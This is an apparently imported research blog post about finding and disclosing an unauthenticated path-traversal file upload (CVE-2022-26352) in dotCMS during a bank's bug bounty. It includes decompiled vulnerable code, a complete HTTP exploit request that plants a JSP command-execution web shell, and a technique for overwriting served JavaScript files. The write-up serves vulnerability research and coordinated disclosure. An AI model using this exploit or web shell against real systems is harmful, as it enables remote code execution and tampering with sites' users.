---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-05-03_hacking-a-bank-by-finding-a-0day-in-dotcms.md
original_filename: 2022-05-03_hacking-a-bank-by-finding-a-0day-in-dotcms.md
title: Hacking a Bank by Finding a 0day in DotCMS
category: documents
detected_topics:
- api-security
- command-injection
- file-upload
- path-traversal
- automation-abuse
tags:
- imported
- documents
- api-security
- command-injection
- file-upload
- path-traversal
- automation-abuse
language: en
raw_sha256: 9525d9854caaf67ca153980174f96b2c0b783f11230f9d9c231a08f2b30b0f88
text_sha256: 6ced1587f0f14a320a6c471c2c2fb5105737aaeb65d0214804945790ffce6f50
ingested_at: '2026-06-28T07:32:11Z'
sensitivity: unknown
redactions_applied: false
---

# Hacking a Bank by Finding a 0day in DotCMS

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-05-03_hacking-a-bank-by-finding-a-0day-in-dotcms.md
- Source Type: markdown
- Detected Topics: api-security, command-injection, file-upload, path-traversal, automation-abuse
- Ingested At: 2026-06-28T07:32:11Z
- Redactions Applied: False
- Raw SHA256: `9525d9854caaf67ca153980174f96b2c0b783f11230f9d9c231a08f2b30b0f88`
- Text SHA256: `6ced1587f0f14a320a6c471c2c2fb5105737aaeb65d0214804945790ffce6f50`


## Content

---
title: "Hacking a Bank by Finding a 0day in DotCMS"
url: "https://blog.assetnote.io/2022/05/03/hacking-a-bank-using-dotcms-rce/"
final_url: "https://www.assetnote.io/resources/research/hacking-a-bank-by-finding-a-0day-in-dotcms"
authors: ["Shubham Shah (@infosec_au)", "Hussein Daher (@HusseiN98D)"]
bugs: ["Directory traversal", "Unrestricted file upload", "RCE"]
publication_date: "2022-05-03"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 2669
---

[Research Notes](/resources/research)

Security Research

May 3, 2022

# Hacking a Bank by Finding a 0day in DotCMS

No items found.

![](https://cdn.prod.website-files.com/6422e507d5004f85d107063a/653795bb35bc995a6f921d3f_citrixbleed.svg)

Creative Commons license

![](https://cdn.prod.website-files.com/64233a8baf1eba1d72a641d4/65a3a93dcf3e9f62fb604af4_homer-chaos.png)

  * [Introduction](https://blog.assetnote.io/2022/05/03/hacking-a-bank-using-dotcms-rce/#introduction)
  * [What is dotCMS?](https://blog.assetnote.io/2022/05/03/hacking-a-bank-using-dotcms-rce/#what-is-dotcms)
  * [Code Analysis](https://blog.assetnote.io/2022/05/03/hacking-a-bank-using-dotcms-rce/#code-analysis)
  * [Making a PoC](https://blog.assetnote.io/2022/05/03/hacking-a-bank-using-dotcms-rce/#making-a-poc)
  * [Hacking a Bank](https://blog.assetnote.io/2022/05/03/hacking-a-bank-using-dotcms-rce/#hacking-a-bank)
  * [Vendor Response](https://blog.assetnote.io/2022/05/03/hacking-a-bank-using-dotcms-rce/#vendor-response)
  * [Remediation Advice](https://blog.assetnote.io/2022/05/03/hacking-a-bank-using-dotcms-rce/#remediation-advice)
  * [Conclusion](https://blog.assetnote.io/2022/05/03/hacking-a-bank-using-dotcms-rce/#conclusion)

The advisory for this issue can be found [here](https://blog.assetnote.io/2022/05/03/dotcms-rce-advisory/).

The CVE for this issue is CVE-2022-26352. The advisory from dotCMS can be found [here](https://www.dotcms.com/security/SI-62).

This security research was performed by [Hussein Daher](https://twitter.com/HusseiN98D) and [Shubham Shah](https://twitter.com/infosec_au).

## Introduction

Hacking a bank is one of those things that you have to cross off your bucket list as a credible hacker. To the outside world, banks are supposed to have impenetrable security, or at least that’s how they usually market themselves. Closer to reality and more in line with the can-do attitude of hackers, banks are just as vulnerable as other organisations and industries.

A few months ago, a friend of mine [Hussein](https://twitter.com/HusseiN98D) came to me with an interesting piece of software that a large bank was using called dotCMS. This bank was running a bug bounty program. He knew that whitebox source code auditing was my jam and asked if I could take a closer look with the aim of compromising this bank.

Through source code analysis, it was possible to find an arbitrary file upload vulnerability, which allowed us to write to any directory on the local system. While we were unable to find a web accessible directory to upload a web shell in the limited time we had, we were able to replace the contents of arbitrary JavaScript files already existing on the system.

This blog post walks through the discovery process of this vulnerability and exploitation process on this large bank.

## What is dotCMS?

dotCMS is an open source content management system written in Java for managing content and content driven sites and applications.

dotCMS provides a community edition of their content management system that is free to download and use. They also provide an Enterprise edition, which is a SaaS-based product, that you can purchase on an annual or monthly subscription.

## Code Analysis

dotCMS is a Java application which makes use of <span class="code_single-line">javax.ws.rs in</span> order to declare API routes in the application. As it uses <span class="code_single-line">javax.ws.rs</span>, it is possible to get a good understanding of some of the attack surface by searching for <span class="code_single-line">@Path(</span> in the code base - this is similar to Spring applications.

There is a lot of attack surface in dotCMS, however we are going to focus on the APIs that were declared using <span class="code_single-line">javax.ws.rs</span>. Within half a day of source code auditing, we came across the file <span class="code_single-line">com/dotcms/rest/ContentResource.java</span> which contained a lot of code related to “content” operations inside dotCMS (locking, searching, uploading content).

We noticed that a lot of these API endpoints didn’t require any sort of authentication to access by default, and started digging into the logic of multipart file uploads.

There is a lot of code in this file, so let’s walk through it step by step until we reach our sink.

The source of the vulnerability can be found below:
  
  
  /*  */ @Path("/content")
  /*  */ public class ContentResource
  
  ... omitted for brevity ...
  
  /*  */  @Deprecated
  /*  */  @POST
  /*  */  @Path("/{params:.*}")
  /*  */  @Produces({"text/plain"})
  /*  */  @Consumes({"multipart/form-data"})
  /*  */  public Response multipartPOST(@Context HttpServletRequest request, @Context HttpServletResponse response, FormDataMultiPart multipart, @PathParam("params") String params) throws URISyntaxException, DotDataException {
  /* 1532 */  return multipartPUTandPOST(request, response, multipart, params, "POST");
  /*  */  }
  
  /*  */  @Deprecated
  /*  */  @PUT
  /*  */  @Path("/{params:.*}")
  /*  */  @Produces({"application/json", "application/javascript", "text/plain"})
  /*  */  @Consumes({"multipart/form-data"})
  /*  */  public Response multipartPUT(@Context HttpServletRequest request, @Context HttpServletResponse response, FormDataMultiPart multipart, @PathParam("params") String params) throws URISyntaxException, DotDataException {
  /* 1508 */  return multipartPUTandPOST(request, response, multipart, params, "PUT");
  /*  */  }
  
  

The <span class="code_single-line">multipartPOST</span> and <span class="code_single-line">multipartPUT</span> functions were both entry points for this vulnerability. The base path of the API was <span class="code_single-line">/api/</span>, and declared at the top of this class (<span class="code_single-line">@Path("/content")</span>), we can see that this API is accessible via <span class="code_single-line">/api/content</span>.

Within the <span class="code_single-line">multipartPOST</span> and <span class="code_single-line">multipartPUT</span> functions, we can see that they will accept requests to arbitrary paths as long as the HTTP method matches either <span class="code_single-line">POST</span> or <span class="code_single-line">PUT</span>. These functions consume HTTP requests in the format of <span class="code_single-line">multipart/form-data</span>.

So far, we have not seen any authentication mechanisms declared in this class, so we can continue following the logic of these functions, which can be found in the <span class="code_single-line">multipartPUTandPOST</span> function.

This function is quite large, however I will walk through the logic of it step by step after you read the code:
  
  
  /*  */  private Response multipartPUTandPOST(HttpServletRequest request, HttpServletResponse response, FormDataMultiPart multipart, String params, String method) throws URISyntaxException, DotDataException {
  /* 1539 */  InitDataObject init = (new WebResource.InitBuilder(request, response))
  /* 1540 */  .requiredAnonAccess(AnonymousAccess.WRITE)
  /* 1541 */  .params(params)
  /* 1542 */  .init();
  /* 1543 */  Contentlet contentlet = new Contentlet();
  /* 1544 */  setRequestMetadata(contentlet, request);
  /*  */  
  /* 1546 */  Map<String, Object> map = new HashMap<>();
  /* 1547 */  List<String> usedBinaryFields = new ArrayList<>();
  /* 1548 */  List<String> binaryFields = new ArrayList<>();
  /* 1549 */  String binaryFieldsInput = null;
  /*  */  
  /* 1551 */  for (BodyPart part : multipart.getBodyParts()) {
  /*  */  
  /* 1553 */  ContentDisposition contentDisposition = part.getContentDisposition();
  /* 1554 */  String name = (contentDisposition != null && contentDisposition.getParameters().containsKey("name")) ? (String)contentDisposition.getParameters().get("name") : "";
  /* 1555 */  MediaType mediaType = part.getMediaType();
  /*  */  
  /* 1557 */  if (mediaType.equals(MediaType.APPLICATION_JSON_TYPE) || name.equals("json")) {
  /*  */  try {
  /* 1559 */  processJSON(contentlet, (InputStream)part.getEntityAs(InputStream.class));
  /*  */  try {
  /* 1561 */  binaryFieldsInput = WebResource.processJSON((InputStream)part.getEntityAs(InputStream.class)).get("binary_fields").toString();
  /* 1562 */  } catch (NullPointerException nullPointerException) {}
  /*  */ 
  /*  */  
  /* 1565 */  if (UtilMethods.isSet(binaryFieldsInput)) {
  /* 1566 */  if (!binaryFieldsInput.contains(",")) {
  /* 1567 */  binaryFields.add(binaryFieldsInput); continue;
  /*  */  }  byte b; int i; String[] arrayOfString;
  /* 1569 */  for (i = (arrayOfString = binaryFieldsInput.split(",")).length, b = 0; b < i; ) { String binaryFieldSplit = arrayOfString[b];
  /* 1570 */  binaryFields.add(binaryFieldSplit.trim());
  /*  */  b++; }
  /*  */  
  /*  */  } 
  /* 1574 */  } catch (JSONException e) {
  /*  */  
  /* 1576 */  Logger.error(getClass(), "Error processing JSON for Stream", (Throwable)e);
  /*  */  
  /* 1578 */  Response.ResponseBuilder responseBuilder = Response.status(400);
  /* 1579 */  responseBuilder.entity(e.getMessage());
  /* 1580 */  return responseBuilder.build();
  /* 1581 */  } catch (IOException e) {
  /*  */  
  /* 1583 */  Logger.error(getClass(), "Error processing Stream", e);
  /*  */  
  /* 1585 */  Response.ResponseBuilder responseBuilder = Response.status(500);
  /* 1586 */  responseBuilder.entity(e.getMessage());
  /* 1587 */  return responseBuilder.build();
  /* 1588 */  } catch (DotSecurityException e) {
  /* 1589 */  throw new ForbiddenException(e);
  /*  */  }  continue;
  /* 1591 */  }  if (mediaType.equals(MediaType.APPLICATION_XML_TYPE) || name.equals("xml")) {
  /*  */  
  /*  */  try {
  /* 1594 */  processXML(contentlet, (InputStream)part.getEntityAs(InputStream.class));
  /* 1595 */  } catch (Exception e) {
  /* 1596 */  if (e instanceof DotSecurityException) {
  /* 1597 */  SecurityLogger.logInfo(getClass(), 
  /* 1598 */  "Invalid XML POSTED to ContentTypeResource from " + request
  /* 1599 */  .getRemoteAddr());
  /*  */  }
  /* 1601 */  Logger.error(getClass(), "Error processing Stream", e);
  /*  */  
  /* 1603 */  Response.ResponseBuilder responseBuilder = Response.status(500);
  /* 1604 */  responseBuilder.entity(e.getMessage());
  /* 1605 */  return responseBuilder.build();
  /*  */  }  continue;
  /* 1607 */  }  if (mediaType.equals(MediaType.APPLICATION_FORM_URLENCODED_TYPE) || name.equals("urlencoded")) {
  /*  */  try {
  /* 1609 */  processForm(contentlet, (InputStream)part.getEntityAs(InputStream.class));
  /* 1610 */  } catch (Exception e) {
  /* 1611 */  Logger.error(getClass(), "Error processing Stream", e);
  /*  */  
  /* 1613 */  Response.ResponseBuilder responseBuilder = Response.status(500);
  /* 1614 */  responseBuilder.entity(e.getMessage());
  /* 1615 */  return responseBuilder.build();
  /*  */  }  continue;
  /* 1617 */  }  if (mediaType.equals(MediaType.TEXT_PLAIN_TYPE)) {
  /*  */  try {
  /* 1619 */  map.put(name, part.getEntityAs(String.class));
  /* 1620 */  processMap(contentlet, map);
  /*  */  
  /* 1622 */  if (contentDisposition != null && UtilMethods.isSet(contentDisposition.getFileName())) {
  /* 1623 */  processFile(contentlet, usedBinaryFields, binaryFields, part);
  /*  */  }
  /*  */  }
  /* 1626 */  catch (Exception e) {
  /* 1627 */  Logger.error(getClass(), "Error processing Plain Tex", e);
  /*  */  
  /* 1629 */  Response.ResponseBuilder responseBuilder = Response.status(500);
  /* 1630 */  responseBuilder.entity(e.getMessage());
  /* 1631 */  return responseBuilder.build();
  /*  */  }  continue;
  /* 1633 */  }  if (contentDisposition != null) {
  /*  */  try {
  /* 1635 */  processFile(contentlet, usedBinaryFields, binaryFields, part);
  /* 1636 */  } catch (IOException e) {
  /*  */  
  /* 1638 */  Logger.error(getClass(), "Error processing Stream", e);
  /*  */  
  /* 1640 */  Response.ResponseBuilder responseBuilder = Response.status(500);
  /* 1641 */  responseBuilder.entity(e.getMessage());
  /* 1642 */  return responseBuilder.build();
  /* 1643 */  } catch (DotSecurityException e) {
  /* 1644 */  throw new ForbiddenException(e);
  /*  */  } 
  /*  */  }
  /*  */  } 
  /*  */  
  /* 1649 */  return saveContent(contentlet, init);
  /*  */  }
  
  

One of the first things that’s worth noting in the above code block is this line: <span class="code_single-line">.requiredAnonAccess(AnonymousAccess.WRITE)</span>. Digging into this, it seems like this functionality is only accessible if <span class="code_single-line">CONTENT_APIS_ALLOW_ANONYMOUS=WRITE</span> is set in the dotCMS configuration. Fortunately, this seems to be set in default configurations.

Next, walking through the code, we can understand that this function is responsible for delegating to specific functions depending on the content-type of the multipart file upload. We can see that this code ends up at the following sinks:

  * <span class="code_single-line">processJSON</span>

  * <span class="code_single-line">processXML</span>

  * <span class="code_single-line">processForm</span>

  * <span class="code_single-line">processMap</span>

  * <span class="code_single-line">processFile</span>

Naturally as you’re auditing this function, it makes sense to audit each of these individual sinks for dangerous functionality. Our immediate thoughts were to look at the <span class="code_single-line">processXML</span> function for XXE and the <span class="code_single-line">processFile</span> function for arbitrary file upload vulnerabilities.

Unfortunately, <span class="code_single-line">processXML</span> was not vulnerable to XXE, likely due to a previous security fix the dotCMS team had applied. However, looking at <span class="code_single-line">processFile</span> code below, we were able to identify an arbitrary file upload vulnerability:
  
  
  /*  */  private void processFile(Contentlet contentlet, List<String> usedBinaryFields, List<String> binaryFields, BodyPart part) throws IOException, DotSecurityException, DotDataException {
  /* 1657 */  InputStream input = (InputStream)part.getEntityAs(InputStream.class);
  /* 1658 */  String filename = part.getContentDisposition().getFileName();
  /* 1659 */  File tmpFolder = new File(String.valueOf(APILocator.getFileAssetAPI().getRealAssetPathTmpBinary()) + UUIDUtil.uuid());
  /*  */  
  /* 1661 */  if (!tmpFolder.mkdirs()) {
  /* 1662 */  throw new IOException("Unable to create temp folder to save binaries");
  /*  */  }
  /*  */  
  /* 1665 */  File tempFile = new File(
  /* 1666 */  String.valueOf(tmpFolder.getAbsolutePath()) + File.separator + filename);
  /* 1667 */  Files.deleteIfExists(tempFile.toPath());
  /*  */  
  /* 1669 */  FileUtils.copyInputStreamToFile(input, tempFile);
  /* 1670 */  List<Field> fields = (new LegacyFieldTransformer(
  /* 1671 */  APILocator.getContentTypeAPI(APILocator.systemUser())
  /* 1672 */  .find(contentlet.getContentType().inode()).fields()))
  /* 1673 */  .asOldFieldList();
  /* 1674 */  for (Field field : fields) {
  /*  */  
  /* 1676 */  String fieldName = field.getFieldContentlet();
  /* 1677 */  if (fieldName.startsWith("binary") && !usedBinaryFields.contains(fieldName)) {
  /*  */  
  /* 1679 */  String fieldVarName = field.getVelocityVarName();
  /* 1680 */  if (binaryFields.size() > 0) {
  /* 1681 */  fieldVarName = binaryFields.remove(0);
  /*  */  }
  /* 1683 */  contentlet.setBinary(fieldVarName, tempFile);
  /* 1684 */  usedBinaryFields.add(fieldName);
  /*  */  break;
  /*  */  } 
  /*  */  } 
  /*  */  }
  
  

We can see that this function constructs a <span class="code_single-line">tempFile</span> using the following logic:

<span class="code_single-line">File tempFile = new File(String.valueOf(tmpFolder.getAbsolutePath()) + File.separator + filename);</span>

Looking further up in this function, we can see that filename is derived from user input (our multipart request):

<span class="code_single-line">String filename = part.getContentDisposition().getFileName();</span>

We finally end up at our sink, at the following line:

<span class="code_single-line">FileUtils.copyInputStreamToFile(input, tempFile);</span>

Using this information that we’ve extrapolated from the source code, we can now construct a PoC which will allow us to upload arbitrary files on the system using directory traversal.

There are no checks being made on the filename or the contents, allowing us to upload arbitrary files to the system to achieve command execution.

## Making a PoC

In order to successfully exploit this issue, we must meet all of the conditions that will allow us to go from the source to the sink. We were able to craft the following HTTP request which would allow you to upload a JSP shell to a web accessible directory using this vulnerability:
  
  
  POST /api/content/ HTTP/1.1
  Host: re.local:8443
  User-Agent: curl/7.64.1
  Accept: */*
  Content-Length: 1162
  Content-Type: multipart/form-data; boundary=------------------------aadc326f7ae3eac3
  Connection: close
  
  --------------------------aadc326f7ae3eac3
  Content-Disposition: form-data; name="name"; filename="../../../../../../../../../srv/dotserver/tomcat-9.0.41/webapps/ROOT/html/js/dojo/a.jsp"
  Content-Type: text/plain
  
  <%@ page import="java.util.*,java.io.*"%>
  <%
  %>
  <HTML><BODY>
  Commands with JSP
  <FORM METHOD="GET" NAME="myform" ACTION="">
  <INPUT TYPE="text" NAME="cmd">
  <INPUT TYPE="submit" VALUE="Send">
  </FORM>
  <pre>
  <%
  if (request.getParameter("cmd") != null) {
  out.println("Command: " + request.getParameter("cmd") + "<BR>");
  Process p;
  if ( System.getProperty("os.name").toLowerCase().indexOf("windows") != -1){
  p = Runtime.getRuntime().exec("cmd.exe /C " + request.getParameter("cmd"));
  }
  else{
  p = Runtime.getRuntime().exec(request.getParameter("cmd"));
  }
  OutputStream os = p.getOutputStream();
  InputStream in = p.getInputStream();
  DataInputStream dis = new DataInputStream(in);
  String disr = dis.readLine();
  while ( disr != null ) {
  out.println(disr);
  disr = dis.readLine();
  }
  }
  %>
  </pre>
  </BODY></HTML>
  --------------------------aadc326f7ae3eac3--
  
  

This will lead to a webshell at the following location:

<https://re.local:8443/html/js/dojo/a.jsp?cmd=whoami>

## Hacking a Bank

Now, we don’t want to lose track for why we audited this software in the first place. We were trying to hack a bank using this software.

Unfortunately, unlike a local development environment, production environments can be quite complex and the software can be deployed in a number of ways that deviate from a perfect local environment. It was not as straight forward to prove impact.

The first step we took was to understand what signified a successful upload, as a way to enumerate writeable directories on the system. Usually on most linux systems, the /tmp/ directory is writeable, so we attempted to upload to this directory:

![](https://cdn.prod.website-files.com/64233a8baf1eba1d72a641d4/65a3a93c55e7eb49e7616750_bank-1.png)

This returned a response size of 0 and a 500 HTTP error response code. This was the indicator that signified that the upload was successful. Knowing this, we enumerated more directories on the local system.

We also fingerprinted the scenario in which the directory did not exist. In these cases, the response would look like the following:

![](https://cdn.prod.website-files.com/64233a8baf1eba1d72a641d4/65a3a93c9f387962490b6b83_bank-2.png)

Lastly, we fingerprinted the scenario in which the directory definitely did exist, but we did not have permissions to write to that folder:

![](https://cdn.prod.website-files.com/64233a8baf1eba1d72a641d4/65a3a93ccb65b48616d6ebd2_bank-3.png)

Now, you may be wondering how we were able to determine the tomcat webroot on a server which we had no idea how the directory structure looked like. We ended up using <span class="code_single-line">/proc/self/cwd/../webapps/ROOT/html/</span> as a way to reach the webroot.

Even though we thought we had struck gold with this neat trick, it turned out that the bank had hardened their environment and no directory or file inside the <span class="code_single-line">ROOT/html</span> directory was able to be written to.

Theoretically, the ability to write arbitrary files on the system can lead to RCE in many ways (replacing JAR files, replacing system files, adding system config via files), and we mentioned this to the team in our report, however we still wanted a way to prove impact through our arbitrary file upload without causing any major disruption.

We discovered a gadget to replace JavaScript files, which were writeable using our arbitrary file upload. The first step of this chain was to obtain the E-Tag value of the JavaScript file by directly visiting it:

![](https://cdn.prod.website-files.com/64233a8baf1eba1d72a641d4/65a3a93de46357c0235c4f8d_bank-4.png)

In order to replace this JavaScript file on the local system, we reconstructed the local path it would be at through the following specification:
  
  
  filename="../FIRST-CHAR/SECOND-CHAR/FULL-ETAG/fileAsset/FILE-NAME"
  
  

So, in our case this was:
  
  
  filename="../2/3/23f890f7-ac11-30fe-1e50-a4f446a11211/fileAsset/file.js"
  
  

Sending our PoC with this filename allowed us to write to arbitrary JavaScript files being served by the application.

Given more time, we were confident that we could have achieved command execution due to the nature of this bug. However, since this vulnerability affected over 100 assets belonging to this bank, we reported the vulnerability.

## Vendor Response

The timeline for disclosure can be found below:

  * **Feb 21st, 2022** : Disclosure of RCE to DotCMS
  * **Mar 2nd, 2022** : Initial response from DotCMS asking us about who will be filing the CVE
  * **Mar 2nd, 2022** : We responded asking DotCMS to file the CVE
  * **Mar 31st, 2022** : We asked if a CVE has been filed and for updates on the vulnerability
  * **Mar 31st, 2022** : Response from DotCMS providing details on fixes that have been deployed and progress
  * **Apr 26th, 2022** : We let DotCMS team know that we will be publishing the vulnerability as per our co-ordinated disclosure process

## Remediation Advice

The remediation details provided from dotCMS’s advisory are satisfactory and will ensure that this vulnerabilty cannot be exploited.

The advisory from DotCMS can be found [here](https://www.dotcms.com/security/SI-62).

## Conclusion

When we take a look at an attack surface of any orgnisation, within any industry, of any size, there are always going to be blind-spots and weaknesses that once identified can lead to critical severity vulnerabilities.

A common theme we have explored in our blog at Assetnote is the blind trust on vendor software, which is often deployed onto critically placed infrastructure belonging to organisations. This is one of the many weaknesses you can identify when looking at an attack surface.

This blog post also represents the stark differences between exploiting a local dev environment compared to a production environment which may have undergone some hardening. Nonetheless, these are all key considerations when building a reliable exploit, and we believe that given more time it should be possible to use the arbitrary file upload to achieve command execution in some way even if the web accessible directories are not writeable to.

As always, customers of our [Attack Surface Management](https://assetnote.io/) platform were the first to know when this vulnerability affected them. We continue to perform original security research in an effort to inform our customers about zero-day vulnerabilities.

Written by:

Shubham Shah

Your subscription could not be saved. Please try again. 

Your subscription has been successful. 

Get updates on our research

Subscribe to our newsletter and stay updated on the newest research, security advisories, and more!

Enter your email address to subscribe

Provide your email address to subscribe. For e.g abc@xyz.com 

SUBSCRIBE 

### More Like This

[Security ResearchNew!Doing the Due Diligence: Analyzing the Next.js Middleware Bypass (CVE-2025-29927)Read moreRead on ASN Blog](/resources/research/doing-the-due-diligence-analyzing-the-next-js-middleware-bypass-cve-2025-29927)

[Security ResearchNew!How an obscure PHP footgun led to RCE in Craft CMSRead moreRead on ASN Blog](/resources/research/how-an-obscure-php-footgun-led-to-rce-in-craft-cms)

[Security ResearchNew!Citrix Denial of Service: Analysis of CVE-2024-8534Read moreRead on ASN Blog](/resources/research/citrix-denial-of-service-analysis-of-cve-2024-8534)

[Security ResearchNew!Nginx/Apache Path Confusion to Auth Bypass in PAN-OS (CVE-2025-0108)Read moreRead on ASN Blog](/resources/research/nginx-apache-path-confusion-to-auth-bypass-in-pan-os)

[Security ResearchNew!Leveraging An Order of Operations Bug to Achieve RCE in Sitecore 8.x - 10.xRead moreRead on ASN Blog](/resources/research/leveraging-an-order-of-operations-bug-to-achieve-rce-in-sitecore-8-x---10-x)

[Security ResearchNew!Insecurity through Censorship: Vulnerabilities Caused by The Great FirewallRead moreRead on ASN Blog](/resources/research/insecurity-through-censorship-vulnerabilities-caused-by-the-great-firewall)

[Back to All](/resources/research)

### Ready to get started?

Get on a call with our team and learn how Assetnote can change the way you secure your attack surface. We'll set you up with a trial instance so you can see the impact for yourself.

[Request a Demo](/demo)

![](https://cdn.prod.website-files.com/6422e507d5004f85d107063a/64241df2676aeba82706ffe8_assetnote-logo.svg)

Address:  
Level 10, 12 Creek Street, Brisbane QLD, 4000  
‍  
Contact:  
[contact@assetnote.io  
  
](mailto:contact@assetnote.io)Press Inquiries:[  
](mailto:contact@assetnote.io)[press@assetnote.io](mailto:press@assetnote.io)

![](https://cdn.prod.website-files.com/6422e507d5004f85d107063a/661f041240ed96ed7a03fe6f_61dc1beb212a1202fc512a76_SOC%202-03-p-500.png)

[](https://twitter.com/assetnote)[](https://www.linkedin.com/company/assetnote/)

Platform Features

[Continuous Asset Discovery](/platform/asset-discovery)

[Deep Asset Enrichment](/platform/asset-enrichment)

[Assetnote Exposure Engine](/platform/assetnote-exposure-engine)

[Expert Security Research](/platform/expert-security-research)

[Collaborative Workflows](/platform/collaborative-workflows)

[Customization](/platform/customization)

Use Cases

[Continuous Asset Discovery and Inventory](/use-cases/continuous-asset-discovery-and-inventory)

[Real-Time Exposure Monitoring](/use-cases/continuous-security-monitoring)

[Attack Surface Reduction](/use-cases/attack-surface-reduction)

[Mergers & Acquisitions](/use-cases/mergers-and-acquisitions)

[Bug Bounty Readiness](/use-cases/bug-bounty-readiness)

© 2026 Assetnote. All rights reserved.

[Privacy Policy](https://assetnote.io/policies/privacy-policy)
